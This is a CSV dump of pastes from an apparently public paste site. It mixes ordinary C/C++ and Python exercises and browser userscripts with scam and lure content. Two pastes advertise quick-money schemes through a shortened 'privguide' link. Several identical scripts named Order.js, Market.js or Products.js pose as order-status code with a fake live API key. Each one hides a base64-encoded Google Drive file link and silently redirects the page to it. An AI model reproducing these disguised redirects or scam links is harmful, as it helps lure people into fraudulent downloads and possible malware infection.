id,title,username,language,date,content
shXPjC1w,Make $1000 15-MINUTES (BEGINNER) FM,Minek10,JavaScript,Saturday 12th of April 2025 06:23:15 AM CDT," 
Pdf https://tinyurl.com/privguidee


ugpBrywJDv
"
R5WVZJt8,Тёплый вязанный список №2,dllbridge,C,Saturday 12th of April 2025 06:23:13 AM CDT,"





#include    <stdio.h>
#include   <stdlib.h>
#include   <locale.h>

///////////////////////////
struct T
{
	
   int      n;
   T   *pNext;	
};


T *pHead  = 0,
  *pTail  = 0;
  

int nX;  
  
 
void  monitor(); 
void _monitor();
 
///////////////////////////////////////////////////// 
int main()                                         // 
{
	
	setlocale(LC_ALL, ""rus""); 
	
	printf(""Введите кол-во элементов: ""); scanf(""%d"", &nX);
	
	T *p;
	
    for(int i = 0; i < nX; i++)
    {
		
		p = (T*)malloc(sizeof(T));
		
		
		
		if(i == 0)   pHead = p;
		else  pTail->pNext = p;
		      pTail        = p;
		      pTail->pNext = 0;

        p->n = i + 100;
	}
	
	monitor();
}



/////////////////////////////////////////////////
void _monitor()                                //
{
	
	 T *p = pHead;
 	 
	 int i = 0;
	 
	 do {  printf(""p->n = %d\n"", p->n);
			
		   p = p->pNext;
			
	    }  while(p);
}



/////////////////////////////////////////////////
void monitor()                                 //
{
	
	 T *p = pHead;
	
	 for(int i = 0; i < nX; i++)
	 {
			
		printf(""%2d) p->n = %d\n"", i, p->n);
			
		p = p->pNext;	
	 }
}


"
S8a6AA49,Order.js,WantingTrae,JavaScript,Saturday 12th of April 2025 06:17:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81530/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fCgqwGDy,EARN $900 INSTANTLY 2025⭐ G8,idogevirtz12,JavaScript,Saturday 12th of April 2025 06:09:34 AM CDT," 
Pdf https://tinyurl.com/privguidee


q7Jn8rwvSx
"
hkbNsn10,Market.js,WantingTrae,JavaScript,Saturday 12th of April 2025 06:01:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38911/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TnW4L9Na,dataNone,TestGuy1,JSON,Saturday 12th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '77b1d07730a7c1b6175adf047494657c8e6af15fe407aa8a6cb033e12219230d640166f88db9747825a157acb042439961730b1fb4b4dcdc42aa7612895b228eaa51ebcd94fb5b6046e28bb7ffa4fefd6da399d1eb2dc4886cd7fdb58a24f4b2a784f259a3b0c03ee98636e17c4b089522d0f1013f5a3ab73b0fd4852be02d7b',
  otherdata: [
    '2441204bc5970c14ffdb9108154d0943',
    '03944acbf336dcf9328ed61048c2e304',
    'af169c09449bbb70cf8a1a2bf0b06b1f',
    '5934fb1f8cf526d49e81dfdfbfeed71a',
    'e6a56e5eeb8fd5d2a7c7c3416fda4c81',
    '40ff3d9f405146cd5380f974e3dcedd6',
    '513d4380e876e33f119a0d2ba2f41dde',
    '80a223a711d1bd201dc40d9e1c7956c0'
  ]
}"
vvEFGe4T,Youtube Chapters Navigator,SheridanCoriana6,JavaScript,Saturday 12th of April 2025 05:53:28 AM CDT,"// ==UserScript==
// @name         Youtube Chapters Navigator
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Simulates CTRL+Arrow key presses when mouse is at screen edges with a 2-second delay
// @match        *://*/*
// @grant        none
// ==/UserScript==
(function() {
    'use strict';
    const EDGE_THRESHOLD = 5; // pixels from edge to trigger the event
    const DELAY = 2000; // delay in milliseconds (2 seconds)
    let lastKeyPressTime = 0;
    function simulateKeyPress(keyCode) {
        const currentTime = Date.now();
        if (currentTime - lastKeyPressTime < DELAY) {
            return; // Don't send another key press if not enough time has passed
        }
        const event = new KeyboardEvent('keydown', {
            bubbles: true,
            cancelable: true,
            keyCode: keyCode,
            ctrlKey: true
        });
        document.dispatchEvent(event);
        lastKeyPressTime = currentTime;
    }
    document.addEventListener('mousemove', function(e) {
        const x = e.clientX;
        const windowWidth = window.innerWidth;
        if (x <= EDGE_THRESHOLD) {
            // Left edge - simulate CTRL + Left Arrow
            simulateKeyPress(37);
        } else if (x >= windowWidth - EDGE_THRESHOLD) {
            // Right edge - simulate CTRL + Right Arrow
            simulateKeyPress(39);
        }
    });
})();"
vjCeL6u5,X (Twitter)- Open post in background,SheridanCoriana6,JavaScript,Saturday 12th of April 2025 05:51:00 AM CDT,"// ==UserScript==
// @name         Otwórz post na Twitterze/X w nowej karcie w tle (minimalna wersja)
// @namespace    http://tampermonkey.net/
// @version      0.9
// @description  Dodaje ikonkę O w prawym górnym rogu każdego posta, która pozwala otworzyć post w nowej karcie w tle
// @author       You
// @match        https://twitter.com/*
// @match        https://x.com/*
// @grant        GM_openInTab
// @grant        GM_addStyle
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    // DEBUG INFO - sprawdź, czy skrypt w ogóle się uruchamia
    console.log(""=== URUCHAMIANIE SKRYPTU 'OTWÓRZ POST NA TWITTERZE/X' v0.9 ==="");

    // Dodaj style dla przycisku bezpośrednio przy uruchomieniu
    GM_addStyle(`
        .tweet-open-btn {
            position: absolute;
            top: 10px;
            right: 0px;
            width: 15px;
            height: 22px;
            // background-color: #1DA1F2;
            background-color: #1e2731;
            color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-weight: bold;
            font-size: 12px;
            cursor: pointer;
            z-index: 9999;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }
        .tweet-open-btn:hover {
            background-color: #0c7abf;
        }
    `);

    // Funkcja znajdująca wszystkie tweety/posty
    function processTweets() {
        console.log(""Szukanie postów..."");

        // Szukaj postów po elemencie article
        const articles = document.querySelectorAll('article:not([data-has-open-btn=""true""])');
        console.log(`Znaleziono ${articles.length} nowych postów do przetworzenia`);

        // Przetwórz każdy post
        articles.forEach((article, index) => {
            try {
                // Oznacz post jako przetworzony
                article.setAttribute('data-has-open-btn', 'true');

                // Znajdź link do statusu
                const statusLinks = article.querySelectorAll('a[href*=""/status/""]');

                if (statusLinks.length > 0) {
                    // Weź pierwszy link do statusu
                    const statusLink = statusLinks[0];
                    let statusUrl = statusLink.getAttribute('href');

                    // Utwórz pełny URL jeśli to relatywny link
                    if (statusUrl.startsWith('/')) {
                        statusUrl = window.location.origin + statusUrl;
                    }

                    console.log(`Post #${index+1} - Znaleziono URL: ${statusUrl}`);

                    // Ustaw pozycję relative na article jeśli nie ma
                    const position = window.getComputedStyle(article).position;
                    if (position === 'static') {
                        article.style.position = 'relative';
                    }

                    // Utwórz przycisk
                    const btn = document.createElement('div');
                    btn.className = 'tweet-open-btn';
                    btn.textContent = 'O';
                    btn.title = 'Otwórz post w karcie w tle';

                    // Dodaj obsługę kliknięcia
                    btn.addEventListener('click', function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        console.log(`Otwieranie w tle: ${statusUrl}`);
                        GM_openInTab(statusUrl, { active: false });
                    });

                    // Dodaj przycisk do postu
                    article.appendChild(btn);
                    console.log(`Dodano przycisk do postu #${index+1}`);
                }
            } catch (err) {
                console.error(`Błąd podczas przetwarzania postu #${index+1}:`, err);
            }
        });
    }

    // Funkcja inicjalizująca z powtarzalnymi próbami
    function initialize() {
        console.log(""Próba inicjalizacji..."");

        // Wykonaj pierwsze przetwarzanie
        processTweets();

        // Utwórz obserwator mutacji DOM
        const observer = new MutationObserver((mutations) => {
            // Sprawdź czy są nowe elementy i uruchom procesowanie
            const hasNewContent = mutations.some(m => m.addedNodes.length > 0);
            if (hasNewContent) {
                processTweets();
            }
        });

        // Rozpocznij obserwację całego body dla maksymalnego pokrycia
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        console.log(""Obserwator DOM uruchomiony"");

        // Dodatkowo sprawdzaj regularnie czy nie pojawiły się nowe posty
        // (jako zabezpieczenie, gdyby observer nie złapał wszystkich zmian)
        setInterval(processTweets, 3000);

        console.log(""Inicjalizacja zakończona"");
    }

    // Funkcja startowa z wielokrotnymi próbami
    function startScript() {
        console.log(""Rozpoczynam uruchamianie skryptu..."");

        // Sprawdź czy są już jakieś posty
        if (document.querySelectorAll('article').length > 0) {
            console.log(""Wykryto posty - uruchamiam inicjalizację"");
            initialize();
        } else {
            console.log(""Nie wykryto jeszcze postów - czekam 1 sekundę"");
            // Spróbuj ponownie za sekundę
            setTimeout(startScript, 1000);
        }
    }

    // Uruchom proces startowy
    console.log(""Oczekiwanie na załadowanie strony..."");

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            console.log(""DOM załadowany - uruchamianie za 1.5 sekundy"");
            setTimeout(startScript, 1500);
        });
    } else {
        console.log(""DOM już załadowany - uruchamianie za 1 sekundę"");
        setTimeout(startScript, 1000);
    }
})();"
xNXAsqeE,Spotify- Open link in background,SheridanCoriana6,JavaScript,Saturday 12th of April 2025 05:48:50 AM CDT,"// ==UserScript==
// @name         Spotify - Otwórz link w tle (Na dole menu utworu)
// @namespace    http://tampermonkey.net/
// @version      2.2
// @description  Dodaje opcję ""Otwórz link w tle"" na końcu menu kontekstowego utworu Spotify.
// @author       Your Name
// @match        https://open.spotify.com/*
// @grant        GM_openInTab
// @grant        GM_addStyle
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    // Optional: Minimal styles if class copying isn't perfect
    GM_addStyle(`
        .custom-background-link-item span { /* Style the inner span if needed */
            /* Example: Add slight padding if text alignment is off */
             /* padding-left: 8px; */
        }
         /* Ensure menu has some padding */
        div[role=""menu""], ul[role=""menu""] {
             padding-top: 4px !important;
             padding-bottom: 4px !important;
        }
    `);

    // --- Store context data ---
    // Defined outside observer/loops
    let trackContextData = {
        url: null,
        targetElement: null // The element that was right-clicked
    };

    // --- Function to handle the click on the custom menu item ---
    // Defined outside the loop to avoid ESLint warning
    function handleMenuItemClick(urlToOpen, clickEvent) {
        clickEvent.stopPropagation();
        clickEvent.preventDefault(); // Prevent default button actions if any
        console.log('[Spotify Background Link] Opening in background:', urlToOpen);
        if (urlToOpen) {
            GM_openInTab(urlToOpen, { active: false, insert: true });
        }
        // Attempt to close the menu - hiding is usually sufficient
        const menuToClose = clickEvent.target.closest('[role=""menu""]');
        if (menuToClose) {
             menuToClose.style.display = 'none';
             // Force removal if hiding doesn't work consistently (might break if parent changes)
             // setTimeout(() => menuToClose.parentElement?.remove(), 50);
        }
        // Clear context data after use (accessing the global is okay here)
        trackContextData = { url: null, targetElement: null };
    }


    // --- Capture right-click event to get track info ---
    document.addEventListener('contextmenu', (e) => {
        // Reset context data before checking the new target
        trackContextData = { url: null, targetElement: null };

        // Find the closest track row ancestor from the clicked element
        const trackRow = e.target.closest('div[data-testid=""tracklist-row""], div.tracklist-row'); // Find the track row itself
        if (trackRow) {
            // Find the link within that specific track row
            const linkElement = trackRow.querySelector('a[data-testid=""internal-track-link""], a[href*=""/track/""]');
            if (linkElement && linkElement.href) {
                trackContextData.url = linkElement.href;
                trackContextData.targetElement = e.target; // Store the element that triggered the context menu
                // console.log('[Spotify Background Link] Context captured:', trackContextData.url);
            } else {
                // console.log('[Spotify Background Link] Track row found, but no track link element within it.');
            }
        } else {
            // console.log('[Spotify Background Link] Right-click was not on or inside a track row.');
        }
    }, true); // Use capture phase

    // --- Observe for context menu appearance ---
    const observer = new MutationObserver((mutations) => {
        for (const mutation of mutations) {
            for (const node of mutation.addedNodes) {
                if (node.nodeType === Node.ELEMENT_NODE) {
                    // Find the menu, could be div or ul
                    let menu = null;
                    if (node.matches && node.matches('[role=""menu""]')) {
                         menu = node;
                    } else if (node.querySelector) {
                         // Sometimes the menu is nested deeper in the added node (e.g., portals)
                         menu = node.querySelector('[role=""menu""]');
                    }

                    // Proceed only if a menu was found, we have a URL from context, and we haven't modified this menu yet
                    // Read the URL from the *current* trackContextData state
                    const currentUrl = trackContextData.url;

                    if (menu && currentUrl && !menu.dataset.customLinkAdded) {
                        // console.log('[Spotify Background Link] Context menu detected:', menu);

                        // Find the ""Dodaj do playlisty"" button *only* to confirm it's the right menu and copy styles
                        const menuItems = menu.querySelectorAll('button[role=""menuitem""]');
                        let referenceButton = null; // Button to copy styles from
                        const targetText = ""Dodaj do playlisty"";

                        for (const item of menuItems) {
                             // Check text content of the button or its inner span
                            const buttonText = (item.textContent || """").trim();
                            const spanText = item.querySelector('span')?.textContent?.trim();

                            if (buttonText.includes(targetText) || (spanText && spanText.includes(targetText))) {
                                referenceButton = item; // Found a good button to copy styles from
                                // console.log('[Spotify Background Link] Found reference button:', referenceButton);
                                break;
                            }
                        }

                        // We need a reference button to copy styles, even if we append at the end
                        if (referenceButton) {
                            // Create the new menu item as a button
                            const newMenuItemButton = document.createElement('button');
                            newMenuItemButton.setAttribute('role', 'menuitem');
                            newMenuItemButton.setAttribute('type', 'button'); // Good practice
                            newMenuItemButton.setAttribute('tabindex', '0'); // Make it focusable

                            // --- Styling: Copy classes from the reference button ---
                            newMenuItemButton.className = referenceButton.className;
                            newMenuItemButton.classList.add('custom-background-link-item'); // Add our custom class

                            // --- Structure: Add text inside a span like Spotify likely does ---
                            const textSpan = document.createElement('span');
                            textSpan.textContent = ""Otwórz link w tle"";
                             // Optionally copy span classes from referenceButton's span if needed
                             const originalSpan = referenceButton.querySelector('span');
                             if(originalSpan) {
                                // Be careful not to copy classes that might conflict
                                // textSpan.className = originalSpan.className;
                             }
                            newMenuItemButton.appendChild(textSpan);

                            // --- Add click listener ---
                            // Pass the URL captured *before* this specific listener was added
                            newMenuItemButton.addEventListener('click', (clickEvent) => {
                                // Call the function defined outside the loop
                                handleMenuItemClick(currentUrl, clickEvent);
                            });

                            // --- Append to the end of the menu ---
                            // Append to the menu element itself (div or ul with role=""menu"")
                            menu.appendChild(newMenuItemButton);
                            // console.log('[Spotify Background Link] Appended ""Otwórz link w tle"" item to the end.');

                            // Mark this specific menu instance as modified
                            menu.dataset.customLinkAdded = 'true';

                        } else {
                             // console.log('[Spotify Background Link] Reference button (""Dodaj do playlisty"") not found in this menu. Cannot add item.');
                        }
                    }
                 }
            }
        }
    });

    // Start observing the body for added nodes (menus)
    observer.observe(document.body, {
        childList: true, // Watch for direct children additions
        subtree: true // Watch for additions in descendants too (important for portals)
    });

    console.log('[Spotify Background Link] Script v2.2 loaded and observing.');

})();"
vt0QRahL,Untitled,WantingTrae,JavaScript,Saturday 12th of April 2025 05:46:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30854/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N9sw0xY2,Products.js,WantingTrae,JavaScript,Saturday 12th of April 2025 05:31:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27021/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
g1PBE38z,Untitled,gandalfbialy,Python,Saturday 12th of April 2025 05:30:40 AM CDT,"import numpy as np
import matplotlib.pyplot as plt

x = np.linspace(0, 50, 500)

def fuzzy_comfort(x):
  return np.maximum(np.minimum(np.minimum((x - 10)  / (20 - 10), 1), (40 - x) / (40 - 30)), 0)

mu_comfort = fuzzy_comfort(x)
print(fuzzy_comfort(50))

# Punkty charakterystyczne
points_x = [10, 20, 30, 40]
points_y = fuzzy_comfort(np.array(points_x))
labels = ['a (10°C)', 'b (20°C)', 'c (30°C)', 'd (40°C)']

# Rysowanie wykresu
plt.figure(figsize=(10, 5))
plt.plot(x, mu_comfort, label='Temperatura komfortowa', color='green')
plt.scatter(points_x, points_y, color='black', zorder=5)

# Etykiety
for i, label in enumerate(labels):
    plt.annotate(label, (points_x[i], points_y[i] + 0.05), ha='center')

plt.title('Funkcja przynależności: Temperatura komfortowa (trapez: 10, 20, 30, 40)')
plt.xlabel('Temperatura [°C]')
plt.ylabel('Przynależność')
plt.grid(True)
plt.legend()
plt.ylim(0, 1.1)
plt.show()"
6wgRie0C,Untitled,gandalfbialy,Python,Saturday 12th of April 2025 05:26:55 AM CDT,"# Punkty charakterystyczne
points_x = [10, 20, 30, 40]
points_y = fuzzy_comfort(np.array(points_x))
labels = ['a (10°C)', 'b (20°C)', 'c (30°C)', 'd (40°C)']

# Rysowanie wykresu
plt.figure(figsize=(10, 5))
plt.plot(x, mu_comfort, label='Temperatura komfortowa', color='green')
plt.scatter(points_x, points_y, color='black', zorder=5)

# Etykiety
for i, label in enumerate(labels):
    plt.annotate(label, (points_x[i], points_y[i] + 0.05), ha='center')

plt.title('Funkcja przynależności: Temperatura komfortowa (trapez: 10, 20, 30, 40)')
plt.xlabel('Temperatura [°C]')
plt.ylabel('Przynależność')
plt.grid(True)
plt.legend()
plt.ylim(0, 1.1)
plt.show()"
bSVMMLbt,好串的数目 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 05:19:07 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const LL MOD = 1000000007;
const int maxn = 100000 + 100;
int n, nxt, idx;
LL ans;
char str[maxn];
LL len[maxn];

int findNxt(int idx) {
    for (int i = idx + 1; i < n; ++i) {
        if (str[i] != str[i - 1] && str[i] != str[i - 1] + 1) {
            return i;
        }
    }
    return n;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    cin >> str;
    n = strlen(str);
    for (int i = 0; i < n; i = nxt) {
        nxt = findNxt(i);
        len[idx] = nxt - i;
        ans += len[idx] * (len[idx] + 1) / 2;
        ++idx;
    }
    for (int i = 1; i < idx; ++i) {
        ans += len[i] * len[i - 1];
    }
    cout << ans << endl;

    return 0;
}
"
XPC9BH3s,Order.js,WantingTrae,JavaScript,Saturday 12th of April 2025 05:15:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70687/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SuAEHG4S,黑客 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 05:02:45 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const LL MOD = 1000000007;
const int maxn = 500000 + 100;
int n, nn;
LL ans;
LL num[maxn];
LL cnt[maxn], fac[maxn], facInv[maxn];

LL fastPow(LL res, LL n) {
    LL ans;
    for (ans = 1; n != 0; n >>= 1) {
        if ((n & 1) == 1) {
            ans = ans * res % MOD;
        }
        res = res * res % MOD;
    }
    return ans;
}

LL inv(LL x) {
    return fastPow(x, MOD - 2);
}

void init() {
    fac[0] = 1;
    for (int i = 1; i < maxn; ++i) {
        fac[i] = fac[i - 1] * i % MOD;
    }
    facInv[maxn - 1] = inv(fac[maxn - 1]);
    for (int i = maxn - 2; i >= 0; --i) {
        facInv[i] = facInv[i + 1] * (i + 1) % MOD;
    }
}

LL solve(int x, int y) {
    if (cnt[x] < 1 || cnt[y] < 1) {
        return 0;
    }
    LL ret = fac[nn];
    --cnt[x];
    --cnt[y];
    for (int i = 0; i < n; ++i) {
        ret = ret * facInv[cnt[num[i]]] % MOD;
    }
    ++cnt[x];
    ++cnt[y];
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    init();
    cin >> n;
    for (int i = 0; i < n; ++i) {
        cin >> num[i];
        ++cnt[num[i]];
    }
    nn = n - 2;
    sort(num, num + n);
    n = unique(num, num + n) - num;
    for (int i = 1; i <= nn / i; ++i) {
        LL tmp = 0;
        if (nn % i == 0) {
            tmp = solve(i, nn / i) % MOD;
            if (nn / i != i) {
                tmp = tmp * 2 % MOD;
            }
        }
        ans = (ans + tmp) % MOD;
    }
    cout << ans << endl;

    return 0;
}
"
X4gjgULf,Market.js,WantingTrae,JavaScript,Saturday 12th of April 2025 05:00:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14776/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LL3UJezK,tree9,Korotkodul,C++,Saturday 12th of April 2025 04:51:45 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(vector<int> a) {
        arr = a;
        if (a.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }
};

int main() {
    tree T;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7,8, 9, 10, 11};
    T.create(a);
    cout << ""TRAVERSAL ORDER:\n"";
    T.trav(T.main_root);
    cout << endl;

    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
